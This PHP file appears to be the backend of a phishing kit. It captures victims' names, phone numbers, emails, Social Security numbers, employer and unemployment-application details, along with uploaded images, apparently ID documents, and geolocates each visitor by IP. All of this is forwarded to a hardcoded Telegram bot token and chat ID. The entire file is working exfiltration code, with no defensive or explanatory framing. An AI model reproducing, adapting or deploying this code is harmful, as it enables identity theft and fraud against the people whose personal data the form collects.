<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$telegram_bot_token = '7002048669:AAFLBgEgHA4YBlG_3n86nz7bkRK43DLM034';
$telegram_chat_id = '5597203828';

function get_user_info() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $details = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    return [
        'ip' => $ip,
        'country' => $details->country ?? 'Unknown',
        'city' => $details->city ?? 'Unknown',
        'region' => $details->region ?? 'Unknown'
    ];
}

function send_telegram($text, $token, $chat_id) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chat_id, 
        'text' => $text,
        'parse_mode' => 'Markdown'
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
            'timeout' => 10
        ],
    ];
    $context = stream_context_create($options);
    return @file_get_contents($url, false, $context);
}

function send_telegram_photo($file_path, $caption, $token, $chat_id) {
    $url = "https://api.telegram.org/bot{$token}/sendPhoto";
    $post_fields = [
        'chat_id'   => $chat_id,
        'caption'   => $caption,
        'photo'     => new CURLFile(realpath($file_path))
    ];
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function is_image_file($file_name) {
    $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
    $extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
    return in_array($extension, $image_extensions);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_info = get_user_info();
    
    // 1. Real-time file upload (one at a time)
    if (isset($_POST['realtime']) && $_POST['realtime'] === 'file_upload') {
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                if (isset($file['tmp_name']) && $file['error'] === UPLOAD_ERR_OK) {
                    $label = ucfirst(str_replace(['_', '-'], ' ', $key));
                    $message = "ðŸ“Ž *Real-time Upload*\n";
                    $message .= "ðŸ“ IP: {$user_info['ip']}\n";
                    $message .= "ðŸ“‚ {$label}\n";
                    
                    send_telegram($message, $telegram_bot_token, $telegram_chat_id);
                    
                    if (is_image_file($file['name'])) {
                        send_telegram_photo($file['tmp_name'], $label, $telegram_bot_token, $telegram_chat_id);
                    }
                }
            }
            echo json_encode(['status' => 'success']);
            exit;
        }
    }
    
    // 2. Final data submission
    if (isset($_POST['submit']) && $_POST['submit'] === 'final_text_only') {
        $data = $_POST;
        
        $message = "âœ… *FINAL SUBMISSION*\n";
        $message .= "================================\n";
        $message .= "ðŸ“ IP: {$user_info['ip']}\n";
        $message .= "ðŸŒŽ {$user_info['city']}, {$user_info['region']}, {$user_info['country']}\n\n";
        
        $message .= "*First:* " . ($data['first_name'] ?? '') . "\n";
        $message .= "*Last:* " . ($data['last_name'] ?? '') . "\n";
        $message .= "*Phone:* " . ($data['phone'] ?? '') . "\n";
        $message .= "*Email:* " . ($data['email'] ?? '') . "\n";
        $message .= "*SSN:* " . ($data['ssn'] ?? '') . "\n";
        $message .= "*Employer:* " . ($data['employer'] ?? '') . "\n";
        $message .= "*Applied:* " . ($data['applied_unemployment'] ?? '') . "\n";
        
        send_telegram($message, $telegram_bot_token, $telegram_chat_id);
        
        echo json_encode(['status' => 'success']);
        exit;
    }
}
?>
